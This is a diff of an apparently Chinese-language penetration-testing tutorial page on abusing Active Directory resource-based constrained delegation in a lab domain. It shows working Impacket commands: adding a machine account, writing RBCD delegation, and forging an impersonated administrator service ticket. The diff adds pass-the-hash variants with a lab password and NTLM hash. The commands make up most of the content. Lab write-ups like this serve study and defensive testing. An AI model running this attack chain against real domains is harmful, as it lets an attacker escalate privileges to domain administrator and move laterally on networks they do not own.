@@ -643,7 +643,7 @@ Server 2016 DC 192.168.88.131 域 EDU.ORG
 Win10 域内普通主机 主机名:EAS111 IP:192.168.80.130 | 192.168.88.140 登录用户EDU\EAS11 域内普通用户
 Win10 域内普通主机 主机名:EAS3   IP:192.168.88.135 登录用户EDU\EAS2 域内普通用户
 
-EAS3是EAS2用户加入域内的机器，我们拿下的EAS111这台机器,并获得了EAS2账户的密码</code></pre>
+EAS3是EAS2用户加入域内的机器，我们拿下的EAS111这台机器,并获得了EAS2账户的密码明文或者hash</code></pre>
 <p>利用AdFind.exe查询每个域机器是由哪个域用户添加进域的，通过 <code>mS-DS-CreatorSID</code> 查看域用户的 <code>sid</code></p>
 <pre><code>AdFind.exe  -b &quot;DC=edu,DC=org&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</code></pre>
 <p><img src="/images/290.png"></p>
@@ -660,10 +660,14 @@ Get-DomainUser -Identity EAS2 -Properties objectsid  </code></pre>
 <p><img src="/images/291.png"></p>
 <p><strong>利用EAS2添加一台机器账户</strong></p>
 <p>因为需要用机器用户去申请票据，本身的 EAS111机器账户我们不知道他的密码所以无法申请票据，所以我们需要添加一个机器用户，用来帮助我们申请票据</p>
-<pre><code>proxychains python3 addcomputer.py -dc-ip 192.168.88.131 -computer-name &#39;test03$&#39; -computer-pass test03 edu.org/eas2:chen@2020</code></pre>
+<pre><code>proxychains python3 addcomputer.py -dc-ip 192.168.88.131 -computer-name &#39;test03$&#39; -computer-pass test03 edu.org/eas2:chen@2020
+
+proxychains python3 addcomputer.py -dc-ip 192.168.88.131 -computer-name &#39;test03$&#39; -computer-pass test03 edu.org/eas2 -hashes bd716f724510ab40f3b89f686411b8cf:bd716f724510ab40f3b89f686411b8cf</code></pre>
 <p><img src="/images/292.png"></p>
 <p><strong>设置test03到EAS3的RBCD</strong></p>
-<pre><code>proxychains python3 rbcd.py -delegate-from test03$ -delegate-to EAS3$ -dc-ip 192.168.88.131 edu.org/eas2:chen@2020 -action write</code></pre>
+<pre><code>proxychains python3 rbcd.py -delegate-from test03$ -delegate-to EAS3$ -dc-ip 192.168.88.131 edu.org/eas2:chen@2020 -action write
+
+proxychains python3 rbcd.py -delegate-from test03$ -delegate-to EAS3$ -dc-ip 192.168.88.131 edu.org/eas2 -action write -hashes bd716f724510ab40f3b89f686411b8cf:bd716f724510ab40f3b89f686411b8cf</code></pre>
 <p><img src="/images/293.png"></p>
 <p><strong>模拟域管理员administrator账号申请访问EAS3的ST，ptt，然后wmiexec到目标主机</strong></p>
 <pre><code>proxychains python3 getST.py -spn cifs/EAS3.edu.org -impersonate administrator -dc-ip 192.168.88.131 edu.org/test03$:test03</code></pre>
